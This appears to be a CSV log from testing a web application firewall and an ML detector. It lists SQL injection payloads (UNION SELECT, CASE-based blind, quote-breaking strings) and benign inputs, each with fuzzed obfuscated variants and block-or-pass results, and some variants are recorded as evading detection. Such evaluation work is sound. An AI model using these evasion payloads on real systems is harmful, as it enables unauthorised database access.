Sr NO.,Original Timestamp,Payload,Original Status,WAF Status,ML Status,Combined Result,Fuzzed Payload 1,Fuzzed Timestamp 1,WAF Status 1,ML Status 1,Combined Result 1,Fuzzed Payload 2,Fuzzed Timestamp 2,WAF Status 2,ML Status 2,Combined Result 2,Fuzzed Payload 3,Fuzzed Timestamp 3,WAF Status 3,ML Status 3,Combined Result 3,Fuzzed Payload 4,Fuzzed Timestamp 4,WAF Status 4,ML Status 4,Combined Result 4,Fuzzed Payload 5,Fuzzed Timestamp 5,WAF Status 5,ML Status 5,Combined Result 5
11,2024-12-16T21:37:33.280827, (  select   (  case when   (  9525  =  9280  )   then 9525 else 9525*  (  select 9525 from master..sysdatabases  )   end   )    ) ,403,403,403,both_correct," (  SeLEct   (  cAsE whEn   (  9525 
 LIKE   '#' liKe '#'  )   THeN/**/(SELECT 9525) ELse 9525*  (  sELECT  and 1 fROm master..sysdatabases  )   eND   )    ) ",2024-12-16T21:37:39.787916,403,403,both_correct," (  selECt   (  CAsE WHeN   (  0x2535 
 like   '#' LIke '#'	 )   THEN (seleCT 9525) ElSE 9525*  (  SeLEcT  And  AND 7341!=7342 FRom master..sysdatabases  )   end   )    ) j",2024-12-16T21:37:48.247707,403,403,both_correct, (  sElEcT   (  caSE WHen /**/ (  0x2535 	 LikE   '#' lIKe '#'	 )   thEn (SelecT 9525) Else (SELECT 0x1)*  (  SELECT  and  and 'x' LIKE 'x'!=7342 frOm master..sysdatabases  )   ENd   )    ) j,2024-12-16T21:37:57.288002,403,403,both_correct," (  sELEct   (  CASE wHeN /**/ (  0x2535 
 LiKe   '#' LiKE '#'	 )   tHEN (sELEcT (SElEcT (SElEct 1))) ELSe (sELeCT 0x1)*  (  SeLEcT  ANd  AND 'x' LiKe 'x'<>'`S' NOT LIKE '`SV'/**/fRom master..sysdatabases  )   enD   )    ) j:w",2024-12-16T21:38:07.668630,403,200,waf_correct_ml_incorrect," (  sELecT  
(  CASe wHEn /*	*/ (  0x2535 
 LIKE   '#' lIke '#'	 )   tHEN (seLect (sElECT (sEleCT (SELECT (SELECT 662 IN (661,662,663)))))) ELSe (SElECt 0x1)*  (  SElEct  anD  aNd 'x' LIKE 'x'<>'`S' not like '`SV' froM master..sysdatabases  )   End   )    ) j:w",2024-12-16T21:38:19.391811,403,403,both_correct
12,2024-12-16T21:38:32.906107,1'||  (  select 'iuud' where 3687  =  3687,403,403,403,both_correct,0x1'||	 (  select 'iuud' where 1486 lIKE 1486  /**/lIKe   (seleCt 1),2024-12-16T21:38:34.972557,403,403,both_correct,0x1'||  (  select 'iuud' Where 0x5ce LiKE 3052 LIKE 3052  /**/lIkE /**/ (SElecT (seLect 1)),2024-12-16T21:38:39.357497,403,403,both_correct,"0x1'||  (/**/ select 'iuud' WherE 0x5ce	likE 3052 likE  OR 0 not like 3694  /*cM,O*/LiKE /**/ (SElEct (select (SElect 1)))",2024-12-16T21:38:44.818147,403,403,both_correct,"0x1'||  (/**/ select 'iuud' WherE 0x5ce LIKe/**/ OR 0!=3195 lIKe  Or 0 not like 3694  /*cM,O*/likE /**/ (SeLecT (selecT (SeleCT (SELECT 1))))",2024-12-16T21:38:51.833624,403,403,both_correct,"0x1'||  (/**/ select 'iuud'/**/WHERE 0x5ce LiKE/**/ oR  AND 1 IN (8830,8831,8832)!=3195 lIKE  || 0 not like 3694 	/**/likE /**/ (seLECt (sELeCt (SeLEct (sElECt (SELECT 1)))))",2024-12-16T21:38:59.827671,403,403,both_correct
13,2024-12-16T21:39:09.074544,"select * from generate_series  (  7536,7536,case when   (  7536  =  7523  )   then 1 else 0 end  )   limit 1--",403,200,403,waf_incorrect_ml_correct,"sELECT * fROM generate_series  (/**/ 7536, aND 1,cASe whEN   (  4856!=4857   like   7523  )   thEn 1 ElSE 0 eND  ) 	 limit (SELECt 1)--",2024-12-16T21:39:14.312625,200,200,both_incorrect,"SelecT * frOM generate_series  (  7536, aND 'Z' NOT LIKE 'ZY',CaSE wheN   (  4856<>4857   LIKe    AND 1  )   Then 1 Else 0 ENd  )   limit (seLEcT 0x1)--",2024-12-16T21:39:21.927464,200,403,waf_incorrect_ml_correct,"SelEcT * from
generate_series  (  (SELECT  OR 0), AnD 'Z' NOT LIKE 'ZY',CasE whEN   (  4856!=7275<>7276   LIKe    aND/**/1  )   tHEN 1 else 0 ENd  )   limit (SelEcT 0x1)--",2024-12-16T21:39:30.385512,200,403,waf_incorrect_ml_correct,"sELECt * FRoM generate_series  (  (SELecT  oR 8647 NOT LIKE 8648), and 'Z' NOT LIKE 'ZY',cASE wHEn   (  4856!= OR 0<>7276   LIke    anD/**/1  )   thEN 1 ELSE 0x0 eND/*4VM?""*/ )   limit (SELeCT 0x1)--",2024-12-16T21:39:39.528317,200,403,waf_incorrect_ml_correct,"sELECT * FroM generate_series  (  (SeLECt  or 0x21c7	NOT LIKE '' liKe ''), AND 'Z' NOT LIKE 'ZY',CasE/**/WHeN   (  4856 NOT LIKE  OR 0<> AND 1   lIKe    aND/**/1  )   Then 1 Else 0x0 enD/**/ )   limit (SeLECT 0x1)--",2024-12-16T21:39:50.311302,200,403,waf_incorrect_ml_correct
14,2024-12-16T21:40:01.604330,"calle andres mellado, 83, 12-d",200,200,200,both_correct,"calle andres mellado, (SELECT 83),	(seLeCT/**/1)!=1756-d",2024-12-16T21:40:03.139345,200,403,waf_correct_ml_incorrect,"calle andres mellado, (SEleCT '&' LIKE/**/'&'), (sElECt/**/0x1)<>(SELECT 1)-d",2024-12-16T21:40:06.926628,403,403,both_incorrect,"calle andres mellado, (SeLect '&' likE/**/'&'), (sELecT 0x1)<>(SeleCT  Or (SeleCt	8356 LIKE 8356))-d",2024-12-16T21:40:11.747755,403,200,waf_incorrect_ml_correct,"calle/*|40*/andres mellado,
(SEleCt '&' LIke/**/'&'), (sEleCT 0x1)<>(seLeCt  oR (sELect	(selEcT  AND 1) LikE 5024<>5025))-d",2024-12-16T21:40:17.905644,403,200,waf_incorrect_ml_correct,"calle/*|40*/andres mellado,
(selECT '&' like/**/'&'), (SeLEct 0x1)<>(SELECt  OR (SelECT
(SeLeCt/**/ And (SELECT 1)) LIkE '.'='.'<> or 0))-d",2024-12-16T21:40:24.809554,403,200,waf_incorrect_ml_correct
15,2024-12-16T21:40:32.694209,1'   )    ) ,403,200,200,both_incorrect, AnD/**/'f' not like 'fE''   )	   ) ,2024-12-16T21:40:33.374645,200,200,both_incorrect," ANd 'f' not like 'fE''   )
   ) ",2024-12-16T21:40:36.091401,200,403,waf_incorrect_ml_correct, aND 'f'/*BC/@J*/not like 'fE''   )	   ) ,2024-12-16T21:40:38.703642,200,200,both_incorrect, aNd 'f'/*BC/@J*/not like 'fE'' 	 )	   )/**/,2024-12-16T21:40:41.657098,200,200,both_incorrect, aND 'f'/*BC/@J*/not like/**/'fE'' 	 )    )/**/,2024-12-16T21:40:44.796527,200,200,both_incorrect
16,2024-12-16T21:40:48.327628,porta catorce 60 6?f,200,200,200,both_correct,"porta catorce
(Select  OR 'x' not like 'x!')/**/6?f",2024-12-16T21:40:49.416393,403,200,waf_incorrect_ml_correct,"porta catorce
(seLeCT 
||/**/'x' not like 'x!')/**/(SEleCT '8'<>'0x52')?f",2024-12-16T21:40:52.895187,403,200,waf_incorrect_ml_correct,"porta catorce	(sEleCt 
||/**/'x' not like 'x!') (seleCt ' OR (SELECT 'n'!='nW')'!='0x52')?f",2024-12-16T21:40:57.468545,200,403,waf_correct_ml_incorrect,porta catorce	(SeleCT  || 'x' not like 'x!') (seLECt ' OR (SELECT 'n'!='nW')' NOT LIKE '0x52')?f,2024-12-16T21:41:02.814623,200,403,waf_correct_ml_incorrect,"porta catorce	(selEcT  || 'x' not like 'x!') (sElecT/**/' OR (SELECT 'n'!='nW')' not
like '0x52')?f",2024-12-16T21:41:08.522638,200,403,waf_correct_ml_incorrect
17,2024-12-16T21:41:14.229687," end and ""xlvn""  =  ""xlvn",403,403,200,waf_correct_ml_incorrect," eNd/**/aND ""xlvn""	  like   ""xlvn",2024-12-16T21:41:15.722123,403,200,waf_correct_ml_incorrect,"	ENd/**/AnD ""xlvn""	  LIKe  /**/""xlvn",2024-12-16T21:41:18.377991,403,200,waf_correct_ml_incorrect," End/**/ANd/**/""xlvn""	  lIKE  /**/""xlvn",2024-12-16T21:41:21.142873,403,200,waf_correct_ml_incorrect," eND/**/And/**/""xlvn""	  LiKE 
 ""xlvn",2024-12-16T21:41:24.074105,403,200,waf_correct_ml_incorrect," End ANd/**/""xlvn""   LiKE 
 ""xlvn",2024-12-16T21:41:26.947880,403,200,waf_correct_ml_incorrect
18,2024-12-16T21:41:29.580710,castrillo de la valduerna,200,200,200,both_correct,"castrillo de/**/la
valduerna",2024-12-16T21:41:30.887999,200,200,both_correct,castrillo/**/de/**/la	valduerna,2024-12-16T21:41:33.313459,200,200,both_correct,"castrillo/*dqV+*/de la
valduerna",2024-12-16T21:41:35.917009,200,200,both_correct,castrillo/*dqV+*/de/**/la valduerna,2024-12-16T21:41:38.509274,200,200,both_correct,"castrillo/*dqV+*/de/**/la/*H|""*/valduerna",2024-12-16T21:41:41.314945,200,200,both_correct
19,2024-12-16T21:41:44.446049,8n66ies4a,200,200,200,both_correct,8n66ies4a,2024-12-16T21:41:45.036801,200,200,both_correct,8n66ies4a,2024-12-16T21:41:46.579169,200,200,both_correct,8n66ies4a,2024-12-16T21:41:48.181066,200,200,both_correct,8n66ies4a,2024-12-16T21:41:49.739385,200,200,both_correct,8n66ies4a,2024-12-16T21:41:51.319569,200,200,both_correct
20,2024-12-16T21:41:52.881327,"-3283  )   where 1948  =  1948 union all select 1948,1948,1948#",403,403,403,both_correct,"-3283  )   whERE (SELECT 1948)/**/ 	like   'f[9' LiKE 'f[9' union all SELect 1948,1948,(SELECT 1)#*q",2024-12-16T21:41:56.248176,403,403,both_correct,"-3283 /**/)   WhERe (sElEct	1948)/**/ 	liKe   'f[9' like 'f[9' union all sElEct  AND 1=8431,(SELECT 1948),(sEleCt 1)#*q",2024-12-16T21:42:02.076955,403,403,both_correct,"-(SELeCT 3283)  )   wHeRE (select	1948)/**/ 	LIKe   'f['9'!='9g'' LikE 'f[9' union all selEcT 	and  aND 1 lIkE 8431,(seleCt 1948),(SeLEcT 1)#*q",2024-12-16T21:42:08.925188,403,403,both_correct,"-(selEct  && 1)  )   WhERE (sElECt
1948)  	LIKE   'f['9'!='9g'' LIke 'f[9' union all selEct 	aND  AnD 1 lIKE (SELECT 8431),(seLeCt 'Es9{'<>'Es9{E'),(seleCT 1)#*qCP",2024-12-16T21:42:16.877479,403,403,both_correct,"-(sELecT 
&& 1)  )   WhEre (SElECt
(SelecT 1948)) /**/	lIke   'f[' OR 0'!='9g'' lIke 'f[9' union all sEleCT 	ANd  AND 1 LIKe (sELEct 8431),(seLECT 'Es9{'<>'Es9{E'),(SeLeCt 9052<>9053)#*qCPnc",2024-12-16T21:42:25.993832,403,200,waf_correct_ml_incorrect
21,2024-12-16T21:42:36.092294,cedric,200,200,200,both_correct,cedric,2024-12-16T21:42:36.503754,200,200,both_correct,cedric,2024-12-16T21:42:37.912985,200,200,both_correct,cedric,2024-12-16T21:42:39.337137,200,200,both_correct,cedric,2024-12-16T21:42:40.758070,200,200,both_correct,cedric,2024-12-16T21:42:42.192967,200,200,both_correct
22,2024-12-16T21:42:43.609480,8ienne2s6,200,200,200,both_correct,8ienne2s6,2024-12-16T21:42:44.190284,200,200,both_correct,8ienne2s6,2024-12-16T21:42:45.734323,200,200,both_correct,8ienne2s6,2024-12-16T21:42:47.304340,200,200,both_correct,8ienne2s6,2024-12-16T21:42:48.866287,200,200,both_correct,8ienne2s6,2024-12-16T21:42:50.414497,200,200,both_correct
23,2024-12-16T21:42:51.965941,1'   )    )    as jtmf where 3937  =  3937,403,403,200,waf_correct_ml_incorrect, OR 0'   )    )    as jtmf where ';a'!=';a3'	  LIke   (SElECt/**/3937),2024-12-16T21:42:54.024705,403,403,both_correct," || (selecT 0x1)'   )
   )    as jtmf where ';a'!=';a3'	  LIke  /*-*/(selEcT/**/9774 LIKE 9774)",2024-12-16T21:42:58.596233,403,403,both_correct,  OR  (SelecT 0x1)'   )    )/**/   as jtmf where ';a'!=';a3'	  like  /*-*/(SElEcT/*Coc'*/4679=0x1247 liKE  ANd 1),2024-12-16T21:43:04.125290,403,200,waf_correct_ml_incorrect,"  or  (SElECT 0x1)'   )    )/**/   as jtmf/**/where ';a'!=';a3'
  like  /**/(SElEcT/*Coc'*/'g' like 'g'=0x1247 lIKE  And  or (SELECT 0))",2024-12-16T21:43:10.494667,403,200,waf_correct_ml_incorrect,"  or  (selecT 0x1)'  
)    )/**/   as jtmf/**/where ';a'!=';a3'
  like   (SElEcT/*Coc'*/4442 iN (4441,4442,4443)=0x1247 lIke  anD  OR (SelecT  oR 0x0))",2024-12-16T21:43:17.894076,403,200,waf_correct_ml_incorrect
24,2024-12-16T21:43:26.271162,"oso, el",200,200,200,both_correct,"oso,/**/el",2024-12-16T21:43:26.742699,200,200,both_correct,"oso,
el",2024-12-16T21:43:28.333258,200,200,both_correct,"oso, el",2024-12-16T21:43:29.789949,200,200,both_correct,"oso,	el",2024-12-16T21:43:31.254272,200,200,both_correct,"oso,
el",2024-12-16T21:43:32.712911,200,200,both_correct
